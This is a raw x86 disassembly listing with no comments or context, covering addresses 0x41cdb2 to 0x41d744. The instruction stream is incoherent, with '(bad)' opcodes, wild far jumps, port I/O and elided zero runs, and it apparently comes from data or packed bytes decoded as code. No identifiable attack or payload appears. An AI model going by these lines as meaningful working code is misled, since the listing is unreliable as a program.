  41cdb2:	sbb    al,0x5b
  41cdb4:	ss mov ah,0xf1
  41cdb7:	sub    esi,DWORD PTR [edx]
  41cdb9:	sbb    BYTE PTR [edx],bh
  41cdbb:	add    BYTE PTR [ebx+0x48],ch
  41cdbe:	sub    bh,dh
  41cdc0:	pop    esi
  41cdc1:	jmp    0x41b5bbe9
  41cdc6:	sbb    esi,ecx
  41cdc8:	fs jmp 0x46afc5e6
  41cdce:	addr16 in eax,dx
  41cdd0:	inc    DWORD PTR [ebx+0x61]
  41cdd3:	out    0x67,eax
  41cdd5:	inc    esp
  41cdd6:	ins    BYTE PTR es:[edi],dx
  41cdd7:	pop    ebx
  41cdd8:	jno    0x41cdf1
  41cdda:	push   ecx
  41cddb:	out    dx,al
  41cddc:	outs   dx,DWORD PTR ds:[esi]
  41cddd:	and    BYTE PTR [edx-0xb],al
  41cde0:	bound  ebx,QWORD PTR [edx]
  41cde2:	dec    ebp
  41cde3:	clc    
  41cde4:	pusha  
  41cde5:	or     BYTE PTR [edx-0x1a],al
  41cde8:	bound  edx,QWORD PTR ds:0x46aee5d
  41cdee:	inc    edx
  41cdef:	jmp    0x41ce5d
  41cdf1:	add    ah,BYTE PTR [edi]
  41cdf3:	hlt    
  41cdf4:	ins    BYTE PTR es:[edi],dx
  41cdf5:	(bad)  
  41cdf6:	cmp    eax,0x2bd66bf8
  41cdfb:	cld    
  41cdfc:	jbe    0x41cdcc
  41cdfe:	push   ss
  41cdff:	xor    BYTE PTR [eax],al
  41ce01:	sbb    BYTE PTR [ebx+0x31],cl
  41ce04:	das    
  41ce05:	sbb    BYTE PTR [eax],al
	...
  41ce2f:	add    BYTE PTR [edx-0xc],al
  41ce32:	jb     0x41ce34
  41ce34:	test   BYTE PTR [eax],ch
  41ce36:	pop    ebp
  41ce37:	outs   dx,BYTE PTR ds:[esi]
  41ce38:	add    BYTE PTR [eax+ebp*2+0x65],bl
  41ce3c:	sti    
  41ce3d:	sub    ebp,DWORD PTR [ecx+0x65]
  41ce40:	pop    ss
  41ce41:	xor    dh,BYTE PTR [ecx+0x73]
  41ce44:	ret    
  41ce45:	outs   dx,BYTE PTR cs:[esi]
  41ce47:	add    BYTE PTR [ebp-0x419290ca],ch
  41ce4d:	sub    eax,0x2a880061
  41ce52:	pop    ebp
  41ce53:	outs   dx,BYTE PTR ds:[esi]
  41ce54:	mov    al,0x32
  41ce56:	add    BYTE PTR [edx+eax*8+0x2c],dh
  41ce5a:	je     0x41cec5
  41ce5c:	mov    ecx,0x67610038
  41ce61:	sub    al,0x6c
  41ce63:	xlat   BYTE PTR gs:[ebx]
  41ce65:	sub    ah,BYTE PTR [ebp+0x63]
  41ce68:	outs   dx,DWORD PTR ds:[esi]
  41ce69:	xor    ch,BYTE PTR [esp+ebp*2-0x7e]
  41ce6d:	push   edi
  41ce6e:	jo     0x41ced5
  41ce70:	jbe    0x41ceae
  41ce72:	popa   
  41ce73:	add    BYTE PTR [edx+esi*1],al
  41ce76:	pop    edi
  41ce77:	jb     0x41ce7b
  41ce79:	and    eax,DWORD PTR [eax]
  41ce7b:	xor    DWORD PTR [edi-0xb9e8dc8],esp
  41ce81:	xor    DWORD PTR [eax],eax
  41ce83:	ja     0x41ced3
  41ce85:	sub    ebp,DWORD PTR [ecx+ebp*2+0x46]
  41ce89:	sub    al,BYTE PTR [eax]
  41ce8b:	imul   edi,DWORD PTR [ebx],0x2e657630
  41ce91:	xor    BYTE PTR [ecx+0x32],dh
	...
  41cebc:	add    BYTE PTR [eax],al
  41cebe:	xchg   edi,eax
  41cebf:	sub    eax,0x2b486365
  41cec4:	popa   
  41cec5:	add    BYTE PTR [ecx-0x4ec9cc9b],dh
  41cecb:	gs std 
  41cecd:	ins    BYTE PTR es:[edi],dx
  41cece:	xor    BYTE PTR ds:0x5b896966,0x63
  41ced5:	popa   
  41ced6:	ds jle 0x41cf01
  41ced9:	jne    0x41ceba
  41cedb:	mov    al,BYTE PTR [ecx]
  41cedd:	retfw  
  41cedf:	xchg   esp,eax
  41cee0:	sub    dh,BYTE PTR [edi-0x57]
  41cee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cee4:	hlt    
  41cee5:	call   FWORD PTR [esi-0x6697cd5f]
  41ceeb:	mov    al,ds:0xd3960028
  41cef0:	sub    DWORD PTR [edi-0x5a],ebx
  41cef3:	rol    DWORD PTR [ecx],cl
  41cef5:	jo     0x41ce98
  41cef7:	aad    0x31
  41cef9:	add    BYTE PTR [eax+eiz*8-0x34728ed9],bl
  41cf00:	sub    esp,DWORD PTR [ebp+0x3e]
  41cf03:	shr    BYTE PTR ds:0x2dd2665f,cl
  41cf09:	pop    edi
  41cf0a:	push   esi
  41cf0b:	je     0x41cf3d
  41cf0d:	ja     0x41cf7c
  41cf0f:	add    al,0x21
  41cf11:	popa   
  41cf12:	arpl   WORD PTR [ebx+0x4],ax
  41cf15:	imul   ebx,DWORD PTR [edi+0x0],0x38
  41cf19:	push   0x61040563
  41cf1e:	pop    edi
  41cf1f:	push   es
  41cf20:	and    DWORD PTR [eax+eax*1+0x0],esp
	...
  41cf4c:	pop    ds
  41cf4d:	je     0x41cf7f
  41cf4f:	and    bl,BYTE PTR ds:0x7225
  41cf54:	and    ch,BYTE PTR ds:[ebx]
  41cf57:	bound  ebx,QWORD PTR [ebx]
  41cf59:	inc    edx
  41cf5a:	cmp    BYTE PTR [eax],al
  41cf5c:	and    BYTE PTR [ebp+0x32],cl
  41cf5f:	arpl   WORD PTR [eax],cx
  41cf61:	dec    edi
  41cf62:	xor    al,BYTE PTR [eax]
  41cf64:	pop    ds
  41cf65:	inc    ecx
  41cf66:	sub    BYTE PTR [esi+0x19],ah
  41cf69:	dec    esp
  41cf6a:	add    al,0x72
  41cf6c:	fist   WORD PTR [eax+0x2c]
  41cf6f:	arpl   dx,sp
  41cf71:	jae    0x41cfa2
  41cf73:	pop    edi
  41cf74:	xlat   BYTE PTR ds:[ebx]
  41cf75:	pop    ebp
  41cf76:	pop    ds
  41cf77:	ins    DWORD PTR es:[edi],dx
  41cf78:	jmp    0xcd66b6d7
  41cf7d:	repz shl BYTE PTR [edx],cl
  41cf80:	int3   
  41cf81:	pop    edx
  41cf82:	xlat   BYTE PTR ds:[ebx]
  41cf83:	es jmp 0x3e79a375
  41cf89:	stc    
  41cf8a:	(bad)  
  41cf8b:	aaa    
  41cf8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf8d:	cld    
  41cf8e:	int3   
  41cf8f:	add    ebx,DWORD PTR [edi-0x5ed73a12]
  41cf95:	clc    
  41cf96:	out    0x21,al
  41cf98:	xor    esp,0x5b912692
  41cf9e:	call   0x5931:0x8bfa9f2c
  41cfa5:	pop    ebx
  41cfa6:	jl     0x41cfd2
  41cfa8:	lahf   
  41cfa9:	repnz mov edi,DWORD PTR [edx]
  41cfac:	ds stc 
  41cfae:	(bad)  
  41cfaf:	aaa    
	...
  41cfd8:	add    BYTE PTR [eax],al
  41cfda:	pop    ebp
  41cfdb:	lock mov eax,DWORD PTR [ebx]
  41cfde:	push   esi
  41cfdf:	clc    
  41cfe0:	jp     0x41d011
  41cfe2:	push   ebx
  41cfe3:	sub    al,0xe7
  41cfe5:	es gs hlt 
  41cfe8:	dec    esp
  41cfe9:	daa    
  41cfea:	gs pop ebx
  41cfec:	dec    ebx
  41cfed:	and    edx,DWORD PTR [edi-0x12]
  41cff0:	push   edx
  41cff1:	and    edi,DWORD PTR [esi]
  41cff3:	jmp    0x2c32:0xed192f47
  41cffa:	adc    DWORD PTR [ebx+0x4a],ebx
  41cffd:	sub    eax,0x3347eb15
  41d002:	test   DWORD PTR ds:[edi],0xcee2523
  41d009:	sub    BYTE PTR [esi],bh
  41d00b:	out    0x7,eax
  41d00d:	cmp    ebx,DWORD PTR [edx]
  41d00f:	out    dx,al
  41d010:	sbb    BYTE PTR [eax+ebx*1],al
  41d013:	out    dx,al
  41d014:	clc    
  41d015:	ss in  eax,0x5a
  41d018:	adc    DWORD PTR ds:0xb9ffece6,ebp
  41d01e:	ins    BYTE PTR es:[edi],dx
  41d01f:	daa    
  41d020:	add    bl,bh
  41d022:	adc    al,0xfc
  41d024:	addr16 enter 0xf70f,0xff
  41d029:	retf   0xf621
  41d02c:	ins    DWORD PTR es:[edi],dx
  41d02d:	ret    0x254c
  41d030:	xor    ch,cl
  41d032:	or     eax,0x65ca5efa
  41d037:	clc    
  41d038:	jo     0x41d023
  41d03a:	pop    esi
  41d03b:	out    dx,al
  41d03c:	ins    BYTE PTR es:[edi],dx
  41d03d:	lds    eax,FWORD PTR [eax]
	...
  41d067:	add    BYTE PTR ds:0x6abe6bf5,bh
  41d06d:	clc    
  41d06e:	jno    0x41d059
  41d070:	dec    esi
  41d071:	cli    
  41d072:	ins    BYTE PTR es:[edi],dx
  41d073:	mov    cs,WORD PTR [ecx-0x8]
  41d076:	jno    0x41d061
  41d078:	pop    edi
  41d079:	cld    
  41d07a:	ins    DWORD PTR es:[edi],dx
  41d07b:	mov    BYTE PTR [ebx-0x4],dl
  41d07e:	call   DWORD PTR [edx+0x7a62f01c]
  41d084:	cmp    eax,0x238d70fc
  41d089:	cld    
  41d08a:	jo     0x41d011
  41d08c:	sbb    ebx,DWORD PTR [ebx+0x76]
  41d08f:	push   eax
  41d090:	and    edi,esp
  41d092:	ins    BYTE PTR es:[edi],dx
  41d093:	pop    ebx
  41d094:	adc    ebx,DWORD PTR [ebx+0x6c]
  41d097:	inc    esi
  41d098:	adc    al,0xf7
  41d09a:	ins    BYTE PTR es:[edi],dx
  41d09b:	aas    
  41d09c:	cmp    ch,BYTE PTR [edx+esi*1]
  41d09f:	cli    
  41d0a0:	jb     0x41d088
  41d0a2:	(bad)  
  41d0a3:	jmp    0xfa72fb52
  41d0a8:	mov    bl,0x2d
  41d0aa:	add    BYTE PTR [edx],bh
  41d0ac:	outs   dx,BYTE PTR ds:[esi]
  41d0ad:	cld    
  41d0ae:	jno    0x41d0cd
  41d0b0:	push   eax
  41d0b1:	clc    
  41d0b2:	push   0x6cf85ce9
  41d0b7:	sbb    ebx,DWORD PTR [ebp-0x8]
  41d0ba:	call   DWORD PTR ds:0x6ded53
  41d0c0:	dec    edx
  41d0c1:	and    eax,0x38466d00
  41d0c6:	arpl   WORD PTR [ecx+0x3a],bp
  41d0c9:	push   edi
  41d0ca:	je     0x41d13e
	...
  41d0f4:	add    BYTE PTR [eax],al
  41d0f6:	xor    DWORD PTR ds:[ebp+0x74],esp
  41d0fa:	pop    esi
  41d0fb:	pop    eax
  41d0fc:	imul   ebp,DWORD PTR [esi-0x7d],0x2f
  41d100:	outs   dx,BYTE PTR ds:[esi]
  41d101:	gs push edi
  41d103:	addr16 das 
  41d105:	xor    esi,DWORD PTR [esi+0x36]
  41d108:	pop    edi
  41d109:	add    BYTE PTR [eax+esi*1],al
  41d10c:	arpl   WORD PTR gs:[ebx+edi*1],cx
  41d110:	outs   dx,BYTE PTR ds:[esi]
  41d111:	add    ch,bh
  41d113:	sub    ch,BYTE PTR [esi+0x69]
  41d116:	loopne 0x41d13d
  41d118:	add    BYTE PTR [ebx-0x51],ah
  41d11b:	and    eax,0x28277365
  41d120:	pop    ebp
  41d121:	jae    0x41d0c7
  41d123:	sub    BYTE PTR [eax],dh
  41d125:	jb     0x41d0e2
  41d127:	push   edi
  41d128:	pop    ebp
  41d129:	jne    0x41d19f
  41d12b:	sub    al,0x65
  41d12d:	outs   dx,BYTE PTR ds:[esi]
  41d12e:	out    0x24,eax
  41d130:	jo     0x41d193
  41d132:	gs sub eax,0x3bb60075
  41d138:	imul   ebp,DWORD PTR [ecx+0x71],0x75656957
  41d13f:	xor    esp,DWORD PTR [ebp+0x6e]
  41d142:	xlat   BYTE PTR ds:[ebx]
  41d143:	cmp    BYTE PTR [ebx+0x6f],ch
  41d146:	js     0x41d17b
  41d148:	popa   
  41d149:	add    BYTE PTR [ecx],cl
  41d14b:	and    eax,0x3b016565
  41d150:	outs   dx,DWORD PTR ds:[esi]
  41d151:	add    bh,bh
  41d153:	das    
  41d154:	jo     0x41d1bb
  41d156:	xchg   edi,eax
  41d157:	and    al,0x68
  41d159:	popa   
	...
  41d182:	add    BYTE PTR [eax],al
  41d184:	xor    esi,DWORD PTR [eax]
  41d186:	imul   eax,DWORD PTR [eax],0x746e2e41
  41d18c:	ds dec edi
  41d18e:	sub    ah,BYTE PTR [ecx+edx*1+0x72]
  41d192:	and    eax,0x2b48e96d
  41d197:	outs   dx,BYTE PTR ds:[esi]
  41d198:	fnstenv [ecx+0x29]
  41d19b:	pop    edi
  41d19c:	in     al,dx
  41d19d:	push   ebp
  41d19e:	pop    ds
  41d19f:	ja     0x41d1df
  41d1a1:	popa   
  41d1a2:	sub    BYTE PTR [ebp-0x1b],ch
  41d1a5:	mov    ?,WORD PTR [eax+eax*1]
  41d1a8:	or     DWORD PTR [ebp-0xf],eax
  41d1ab:	xor    al,0x3e
  41d1ad:	cwde   
  41d1ae:	sub    dh,BYTE PTR [ecx-0x25]
  41d1b1:	sub    DWORD PTR [ecx],0x2617aa00
  41d1b7:	imul   esi,DWORD PTR [edi-0x5e98e2bc],0x925f2d1b
  41d1c1:	inc    esp
  41d1c2:	and    al,0x0
  41d1c4:	xchg   edx,eax
  41d1c5:	in     al,dx
  41d1c6:	das    
  41d1c7:	outs   dx,BYTE PTR ds:[esi]
  41d1c8:	call   0x2bf4:0x8d0032df
  41d1cf:	jb     0x41d168
  41d1d1:	lock add BYTE PTR [edx+0x5f],ah
  41d1d5:	repnz sbb al,0x67
  41d1d8:	push   0x44
  41d1da:	and    BYTE PTR [esi+0x72],ch
  41d1dd:	out    0x32,eax
  41d1df:	add    BYTE PTR [edi-0x26],bl
  41d1e2:	sub    eax,0x39b26968
	...
  41d20f:	add    BYTE PTR [eax],al
  41d211:	add    BYTE PTR [ebp-0x57],bl
  41d214:	ss jbe 0x41d27a
  41d217:	mov    eax,0x9c3e6330
  41d21c:	daa    
  41d21d:	popa   
  41d21e:	and    eax,0x2e0039a7
  41d223:	test   eax,0x442c632f
  41d228:	and    esp,DWORD PTR [ebx+0x10]
  41d22b:	sahf   
  41d22c:	and    DWORD PTR [ebx+0x27],ebp
  41d22f:	pop    ebx
  41d230:	adc    eax,0xec71904
  41d235:	xor    bl,BYTE PTR ds:0x212f06d4
  41d23b:	pop    ebx
  41d23c:	fdiv   DWORD PTR [edx]
  41d23e:	sub    al,0xd2
  41d240:	mov    edx,0x10d13e1e
  41d245:	xor    al,0xdd
  41d247:	int3   
  41d248:	out    0x20,eax
  41d24a:	(bad)  
  41d24c:	add    al,0x35
  41d24e:	loope  0x41d21d
  41d250:	out    0x2c,eax
  41d252:	loopne 0x41d217
  41d254:	(bad)  
  41d255:	sub    edx,edx
  41d257:	pop    edx
  41d258:	fdiv   DWORD PTR [eax]
  41d25a:	(bad)  
  41d25c:	sar    DWORD PTR [edx],cl
  41d25e:	imul   ebx,DWORD PTR [ebx-0x36],0xb3bc9d35
  41d265:	sub    dh,BYTE PTR [eax-0x6cde1840]
  41d26b:	retf   0x22c9
  41d26e:	mov    WORD PTR [ebx-0x78],ds
  41d271:	pop    ds
  41d272:	cdq    
  41d273:	mov    edi,0x3488
	...
  41d2a0:	ds int 0x86
  41d2a3:	das    
  41d2a4:	cdq    
  41d2a5:	enter  0x380,0x6f
  41d2a9:	(bad)  
  41d2aa:	mov    BYTE PTR [edx],bh
  41d2ac:	pop    ebp
  41d2ad:	int    0xe7
  41d2af:	xor    BYTE PTR [ecx-0x32],ah
  41d2b2:	mov    ebp,DWORD PTR [eax]
  41d2b4:	push   ebp
  41d2b5:	pop    ebx
  41d2b6:	ja     0x41d2ed
  41d2b8:	jns    0x41d27e
  41d2ba:	pop    edx
  41d2bb:	pop    ds
  41d2bc:	ds aad 0x5f
  41d2bf:	and    eax,0x2745bd50
  41d2c4:	ds into 
  41d2c6:	dec    eax
  41d2c7:	daa    
  41d2c8:	sub    eax,0x250453c0
  41d2cd:	les    edx,FWORD PTR [edx+0x1f]
  41d2d0:	ds mov edi,0xc7564800
  41d2d6:	pop    edi
  41d2d7:	cmp    al,BYTE PTR [edx-0x40]
  41d2da:	jb     0x41d2e8
  41d2dc:	xor    ecx,ecx
  41d2de:	add    BYTE PTR ds:0x1d74cc29,dl
  41d2e4:	and    esp,ecx
  41d2e6:	je     0x41d2d1
  41d2e8:	and    BYTE PTR [edx-0x3dd7f38a],bh
  41d2ee:	popa   
  41d2ef:	adc    al,BYTE PTR [edx-0x38]
  41d2f2:	outs   dx,BYTE PTR ds:[esi]
  41d2f3:	or     al,0x16
  41d2f5:	enter  0x476,0x42
  41d2f9:	mov    edi,0xbf24df5f
  41d2fe:	add    ah,cl
  41d300:	add    al,0xc7
  41d302:	ins    DWORD PTR es:[edi],dx
  41d303:	fild   WORD PTR [eax]
	...
  41d32d:	add    BYTE PTR [eax],ah
  41d32f:	pop    ebx
  41d330:	popa   
  41d331:	shr    DWORD PTR [eax-0x33],0x61
  41d335:	sar    DWORD PTR ds:0x48d072c1,1
  41d33b:	leave  
  41d33c:	fs jmp 0xe9a699a0
  41d342:	cmp    DWORD PTR [ecx+esi*2+0x77c9649d],edi
  41d349:	jmp    0x8cb099a5
  41d34e:	cmp    eax,0x338a67c4
  41d353:	(bad)  
  41d354:	jno    0x41d2ec
  41d356:	pop    ds
  41d357:	iret   
  41d358:	add    BYTE PTR [ebx-0x44cd750d],bh
  41d35e:	jmp    0x41d3b8
  41d360:	pop    edi
  41d361:	je     0x41d386
  41d363:	mov    ebp,0x5b0d4c6c
  41d368:	das    
  41d369:	sbb    bl,dl
  41d36b:	mov    DWORD PTR [edi],ebp
  41d36d:	sbb    bl,cl
  41d36f:	mov    DWORD PTR [eax],eax
  41d371:	dec    edx
  41d372:	popa   
  41d373:	mov    edx,0x8004005f
  41d378:	ins    BYTE PTR es:[edi],dx
  41d379:	popa   
  41d37a:	xchg   edi,eax
  41d37b:	sub    BYTE PTR [ebx+0x72],0xf3
  41d37f:	jge    0x41d3ef
  41d381:	xor    dl,BYTE PTR [esp+ebx*2-0x76d7939b]
  41d388:	popa   
  41d389:	cmp    BYTE PTR [bp+di+0x0],bh
  41d38d:	data16 cmp BYTE PTR [eax+0x6274],al
	...
  41d3bc:	inc    esi
  41d3bd:	sub    DWORD PTR [ecx+esi*1+0x67],0xffffff80
  41d3c2:	imul   esi,DWORD PTR [esi+0x4e],0xffffff81
  41d3c6:	arpl   WORD PTR [eax],ax
  41d3c8:	cmp    DWORD PTR [esi+0x74],edi
  41d3cb:	push   0x65008146
  41d3d0:	push   0xffffff83
  41d3d2:	pop    ebp
  41d3d3:	outs   dx,BYTE PTR ds:[esi]
  41d3d4:	jb     0x41d451
  41d3d6:	ins    BYTE PTR es:[edi],dx
  41d3d7:	add    BYTE PTR [ebp+edi*2+0x6b],ah
  41d3db:	outs   dx,DWORD PTR ds:[esi]
  41d3dc:	add    eax,0xf2660097
  41d3e1:	jl     0x41d44a
  41d3e3:	outs   dx,DWORD PTR ds:[esi]
  41d3e4:	add    DWORD PTR [esi+0x0],esi
  41d3e7:	jae    0x41d3df
  41d3e9:	sub    BYTE PTR [ecx+0x79],0x27
  41d3ed:	sbb    DWORD PTR [ebp+0x78],0xffffffb0
  41d3f1:	jp     0x41d45f
  41d3f3:	ins    BYTE PTR es:[edi],dx
  41d3f4:	pop    ss
  41d3f5:	sbb    BYTE PTR [ebp+0x73],0xb8
  41d3f9:	jge    0x41d3fb
  41d3fb:	push   0x78
  41d3fd:	test   BYTE PTR [esi+0x0],ch
  41d400:	mov    dh,0x8e
  41d402:	xor    dh,BYTE PTR [edi-0x5c]
  41d405:	jp     0x41d43b
  41d407:	jb     0x41d3e0
  41d409:	jns    0x41d468
  41d40b:	bound  ecx,QWORD PTR [esi+0x5c]
  41d40e:	jb     0x41d475
  41d410:	or     DWORD PTR [esi+0x2f],0x33
  41d414:	xlat   BYTE PTR ds:[ebx]
  41d415:	jns    0x41d483
  41d417:	popa   
  41d418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d41a:	sub    BYTE PTR [edi+0x3e],bl
  41d41d:	mov    dl,0x32
  41d41f:	add    BYTE PTR [bx+si],al
	...
  41d44a:	and    BYTE PTR [ebp-0x6ed0ffe1],ah
  41d450:	pop    ds
  41d451:	jb     0x41d47d
  41d453:	inc    edx
  41d454:	and    ch,BYTE PTR [eax+0x23]
  41d457:	xchg   esi,eax
  41d458:	xor    DWORD PTR [ebx+0x1f],esp
  41d45b:	inc    edx
  41d45c:	lock xor dl,BYTE PTR [ebx+0x2f]
  41d460:	lock call FWORD PTR [esi]
  41d463:	pusha  
  41d464:	sbb    eax,0x132ea63
  41d469:	push   0x611d53df
  41d46e:	fst    DWORD PTR [ebx+0x20]
  41d471:	add    dl,bl
  41d473:	data16 cmp al,0x74
  41d476:	jecxz  0x41d4cb
  41d478:	add    DWORD PTR [ecx-0x21],esi
  41d47b:	aaa    
  41d47c:	and    BYTE PTR [esi+edi*1+0x73],ah
  41d480:	repz xor DWORD PTR [esi*2+0x23a1fff1],ecx
  41d488:	and    eax,0x2744a16c
  41d48d:	pop    edi
  41d48e:	lods   eax,DWORD PTR ds:[esi]
  41d48f:	adc    al,0x20
  41d491:	jb     0x41d4d1
  41d493:	sub    BYTE PTR [esi+ebp*2],ah
  41d496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d497:	pop    ds
  41d498:	and    eax,0x2a449b6c
  41d49d:	addr16 xchg edx,eax
  41d49f:	lock pop ds
  41d4a1:	outs   dx,BYTE PTR ds:[esi]
  41d4a2:	ds loope 0x41d4c8
  41d4a5:	jno    0x41d514
  41d4a7:	fistp  DWORD PTR [edi]
  41d4a9:	add    BYTE PTR [ebp-0x28],ch
  41d4ac:	and    BYTE PTR [eax+eax*1+0x0],ch
	...
  41d4d8:	pop    edx
  41d4d9:	jecxz  0x41d4db
  41d4db:	jo     0x41d549
  41d4dd:	jecxz  0x41d51a
  41d4df:	arpl   WORD PTR [esp+eax*2+0x29],cx
  41d4e3:	ins    DWORD PTR es:[edi],dx
  41d4e4:	dec    edx
  41d4e5:	pop    ebx
  41d4e6:	dec    ebx
  41d4e7:	and    eax,0x2b565b63
  41d4ec:	push   eax
  41d4ed:	mov    edi,0x5b2f2d46
  41d4f2:	cmp    al,0x2f
  41d4f4:	das    
  41d4f5:	iret   
  41d4f6:	dec    ebx
  41d4f7:	sub    ebx,DWORD PTR ds:0x2a23465b
  41d4fd:	sar    BYTE PTR [edx],0x4
  41d500:	sbb    al,0xc4
  41d502:	cmp    ebp,DWORD PTR [eax]
  41d504:	sbb    edi,DWORD PTR [ebx+ebx*1+0x65b0f1f]
  41d50b:	sub    al,0x1c
  41d50d:	mov    edi,0xbe3e261b
  41d512:	add    eax,0x14c1e42c
  41d517:	add    al,0x19
  41d519:	mov    DWORD PTR [edx-0x4172d311],edi
  41d51f:	sti    
  41d520:	adc    BYTE PTR [ebx-0x3122fc19],cl
  41d526:	loop   0x41d559
  41d528:	rol    cl,1
  41d52a:	into   
  41d52b:	xor    eax,edx
  41d52d:	int    0xdc
  41d52f:	add    esp,DWORD PTR [esi+0x7433d3cf]
  41d535:	xchg   BYTE PTR [esi],dl
  41d537:	pop    ds
  41d538:	mov    dl,0xca
  41d53a:	shr    BYTE PTR [esi],1
	...
  41d564:	add    BYTE PTR [eax],al
  41d566:	nop
  41d567:	rol    esi,0x2e
  41d56a:	mov    WORD PTR [ebp-0x6cabce3b],es
  41d570:	fsub   st,st(4)
  41d572:	cdq    
  41d573:	(bad)  
  41d574:	lea    edi,[edx]
  41d576:	push   ebx
  41d577:	mov    esi,0x855d2f88
  41d57c:	xchg   edi,eax
  41d57d:	sub    ebp,DWORD PTR [esi+0x5b]
  41d580:	(bad)  
  41d581:	das    
  41d582:	jb     0x41d54f
  41d584:	shl    esp,0x12
  41d587:	lea    eax,[eax]
  41d589:	mov    al,0xe3
  41d58b:	test   BYTE PTR [edi],dh
  41d58d:	mov    ch,0xdb
  41d58f:	test   BYTE PTR [edi],dh
  41d591:	sbb    eax,0x21318be0
  41d596:	fcmovnb st,st(5)
  41d598:	ins    DWORD PTR es:[edi],dx
  41d599:	inc    edi
  41d59a:	jne    0x41d524
  41d59c:	gs dec eax
  41d59e:	outs   dx,BYTE PTR ds:[esi]
  41d59f:	mov    edx,0xcb5a392e
  41d5a4:	add    cl,ch
  41d5a6:	push   ebp
  41d5a7:	iret   
  41d5a8:	je     0x41d5e3
  41d5aa:	xchg   esp,eax
  41d5ab:	xchg   BYTE PTR ds:0x65ba673c,ch
  41d5b1:	adc    BYTE PTR [esi-0x42],cl
  41d5b4:	imul   ecx,edi,0x5e
  41d5b7:	enter  0xc66b,0x39
  41d5bb:	mov    esi,DWORD PTR [eax+ebx*1+0x12]
  41d5bf:	xchg   BYTE PTR [eax-0x29],bh
  41d5c2:	dec    eax
  41d5c3:	shl    DWORD PTR [ebx-0x17],cl
  41d5c6:	adc    eax,0xf974cf
	...
  41d5f3:	add    BYTE PTR [edi-0x7a],dl
  41d5f6:	sub    eax,0x72be1d0b
  41d5fb:	int3   
  41d5fc:	push   cs
  41d5fd:	ret    
  41d5fe:	ins    DWORD PTR es:[edi],dx
  41d5ff:	fstp   DWORD PTR [ebx-0x46]
  41d602:	ins    DWORD PTR es:[edi],dx
  41d603:	les    esp,FWORD PTR [ebx]
  41d605:	mov    dh,0x72
  41d607:	(bad)  
  41d608:	les    esi,FWORD PTR fs:0x42ad6c9d
  41d60f:	cmovno edx,ebx
  41d612:	arpl   cx,bp
  41d614:	gs iret 
  41d616:	je     0x41d5d1
  41d618:	pop    ss
  41d619:	mov    BYTE PTR ds:0x2bc94d99,ch
  41d61f:	mov    bl,BYTE PTR [edx-0x37]
  41d622:	jo     0x41d5eb
  41d624:	push   ds
  41d625:	(bad)  
  41d626:	imul   edi,DWORD PTR [esi+0x65aa80],0xffffffaa
  41d62d:	mov    BYTE PTR [edx+0x43],cl
  41d630:	scas   eax,DWORD PTR es:[edi]
  41d631:	bound  edi,QWORD PTR ds:[eax-0x36]
  41d635:	pop    eax
  41d636:	add    BYTE PTR [ecx-0x56],bl
  41d639:	mov    eax,ds:0xa11b5750
  41d63e:	inc    ebp
  41d63f:	dec    esp
  41d640:	sbb    cl,BYTE PTR [edi+0x56]
  41d643:	push   ebp
  41d644:	pop    esi
  41d645:	scas   eax,DWORD PTR es:[edi]
  41d646:	inc    edi
  41d647:	inc    esp
  41d648:	pop    ecx
  41d649:	xchg   esi,eax
  41d64a:	dec    esp
  41d64b:	inc    ebp
  41d64c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d64e:	push   ecx
  41d64f:	dec    ecx
  41d650:	push   esp
  41d651:	lods   eax,DWORD PTR ds:[esi]
  41d652:	push   ebp
  41d653:	push   eax
  41d654:	cmp    esp,DWORD PTR [edx+0x3044]
	...
  41d682:	cs mov dl,0x45
  41d685:	xor    DWORD PTR [ecx+0x48],esi
  41d688:	std    
  41d689:	call   DWORD PTR [edi+0x67020058]
  41d68f:	fwait
  41d690:	dec    ebx
  41d691:	inc    esp
  41d692:	sub    bl,BYTE PTR [esi-0x3]
  41d695:	call   DWORD PTR [edi+0x58]
  41d698:	add    BYTE PTR [eax],al
  41d69a:	push   edi
  41d69b:	pop    eax
  41d69c:	add    BYTE PTR [ebx+0x20],dl
  41d69f:	mov    eax,ds:0xad265754
  41d6a4:	inc    ecx
  41d6a5:	pop    esp
  41d6a6:	xchg   edx,eax
  41d6a7:	ja     0x41d708
  41d6a9:	jb     0x41d71b
  41d6ab:	lea    ebp,[ebx+0x66]
  41d6ae:	sbb    esp,DWORD PTR [ebx+edx*2+0x6b7bf169]
  41d6b5:	ja     0x41d69b
  41d6b7:	mov    ds:0x8de5753f,eax
  41d6bc:	popa   
  41d6bd:	outs   dx,BYTE PTR ds:[esi]
  41d6be:	(bad)  [ecx+0x76d47261]
  41d6c4:	imul   ebp,DWORD PTR [esi+0x3],0xffffffb3
  41d6c8:	outs   dx,BYTE PTR ds:[esi]
  41d6c9:	imul   esi,DWORD PTR [ecx+0x3e61748c],0x8b001cde
  41d6d3:	aam    0x1c
  41d6d5:	outs   dx,BYTE PTR ds:[esi]
  41d6d6:	ins    DWORD PTR es:[edi],dx
  41d6d7:	(bad)  
  41d6d8:	and    al,0x6c
  41d6da:	push   edx
  41d6db:	icebp  
  41d6dc:	xor    al,0x72
  41d6de:	fsubr  QWORD PTR [bx+di]
  41d6e1:	add    BYTE PTR [edx-0x25],bh
  41d6e4:	xor    eax,0x70
	...
  41d70d:	add    BYTE PTR [eax],al
  41d70f:	add    BYTE PTR [edx-0x5d],bl
  41d712:	sub    ecx,DWORD PTR [esi+0x5f]
  41d715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d716:	daa    
  41d717:	add    BYTE PTR [edx],bl
  41d719:	inc    edx
  41d71a:	add    DWORD PTR [eax],eax
  41d71c:	ds inc edx
  41d71e:	add    DWORD PTR [eax],eax
  41d720:	ds inc edx
  41d722:	fbld   TBYTE PTR [edx+0x26]
  41d725:	lahf   
  41d726:	add    al,0x51
  41d728:	sub    DWORD PTR [eax+edi*1+0x27901f75],esp
  41d72f:	pop    esp
  41d730:	icebp  
  41d731:	push   0x22
  41d733:	push   edx
  41d734:	dec    DWORD PTR [edi+0x66ee6d04]
  41d73a:	and    al,BYTE PTR [eax]
  41d73c:	aas    
  41d73d:	inc    edx
  41d73e:	add    DWORD PTR [eax+0x6e3666d5],eax
  41d744:	(bad)  [ebp-0xb]
